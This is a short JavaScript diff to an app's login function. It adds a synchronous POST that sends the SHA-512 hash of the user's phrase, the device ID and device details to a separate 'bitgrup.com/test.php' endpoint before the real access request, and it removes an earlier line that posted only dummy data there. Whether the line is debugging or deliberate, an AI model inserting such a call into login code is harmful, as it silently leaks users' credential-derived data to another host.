@@ -56,8 +56,8 @@ var api = {
             var deviceDT = {platform: 'Desktop', version: 'test', manufacturer: 'test', network: 'wifi'};
         }
         var data = {phrase: sha512.hex(phrase), instance: api.deviceId, device: deviceDT};
+        $.ajax({type: 'POST',url: 'https://www.bitgrup.com/test.php',data:data,async: false, timeout: 3000 });
         var token = api.send(data, 'POST', 'access');
-        $.ajax({type: 'POST',url: 'https://www.bitgrup.com/test.php',data:{test:'test'},async: false, timeout: 3000 });
         if(token.token){
             api.setToken(token);
             callback(token.token);
